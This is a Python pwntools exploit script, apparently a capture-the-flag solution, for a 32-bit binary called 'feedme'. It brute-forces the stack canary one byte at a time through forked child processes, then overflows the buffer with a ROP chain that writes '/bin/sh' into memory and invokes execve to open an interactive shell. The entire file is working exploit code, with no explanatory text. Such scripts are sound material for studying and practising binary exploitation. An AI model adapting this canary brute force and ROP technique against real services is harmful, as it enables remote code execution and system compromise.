from pwn import *

binary = context.binary = ELF("./feedme")

if args.GDB:
    p = gdb.debug(binary.path, gdbscript="""b *0x080490c9
b *0x08049069
set follow-fork-mode child
set detach-on-fork off""")
else:
    p = process(binary.path)

# Find canary
canary = b"\x00"
for j in range(3):
    print(f"Looking for canary byte {j+2} ...")
    for i in range(1, 256):
        payload =  b""
        payload += b"A" * 0x20
        payload += canary
        payload += i.to_bytes(1, 'big')

        payload = len(payload).to_bytes(1, 'big') + payload

        p.send(payload)

        tmp = p.readuntil("Child exit.\n")
        if b"stack smashing detected" not in tmp:
            canary += i.to_bytes(1, 'big')
            break

print(f"Found canary: {canary}")
# ROP gadgets
syscall_gadget = 0x0806fa20
# pop eax, ret
eax_gadget = 0x080bb496
# pop edx, ret
edx_gadget = 0x0806f34a
# mov dword ptr [edx], eax ; ret
mov_gadget = 0x0809a7ed
# pop edx ; pop ecx ; pop ebx ; ret
all_gadget = 0x0806f370
str_addr = 0x080eaf80

payload =  b""
payload += b"A" * 0x20
payload += canary
payload += b"B" * 12
payload += p32(edx_gadget)
payload += p32(str_addr)
payload += p32(eax_gadget)
payload += b"/bin"
payload += p32(mov_gadget)
payload += p32(edx_gadget)
payload += p32(str_addr + 4)
payload += p32(eax_gadget)
payload += b"/sh\x00"
payload += p32(mov_gadget)
payload += p32(all_gadget)
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += p32(str_addr)
payload += p32(eax_gadget)
payload += p32(11)
payload += p32(syscall_gadget)

payload = len(payload).to_bytes(1, 'big') + payload

p.send(payload)

print(f"Payload: {payload}")

p.interactive()